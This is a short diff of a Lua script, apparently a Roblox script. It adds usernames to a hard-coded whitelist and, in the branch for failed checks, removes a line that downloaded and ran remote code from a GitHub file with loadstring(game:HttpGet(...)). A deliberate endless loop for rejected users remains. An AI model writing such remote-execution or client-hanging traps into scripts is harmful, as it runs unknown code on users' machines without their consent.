@@ -39,6 +39,10 @@ elseif a=="bolt61584"then
 _G.white=true
 elseif a=="CN_laoda84"then
 _G.white=true
+elseif a=="zjpndjfkz"then
+_G.white=true
+elseif a=="kiad70koko0"then
+_G.white=true
 end
 if _G.white==true then
     print("验证成功")
@@ -48,7 +52,6 @@ else --验证失败执行↓
    wait(0.1)
    while true do
        print("想过验证？")
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()
    end
 end
 
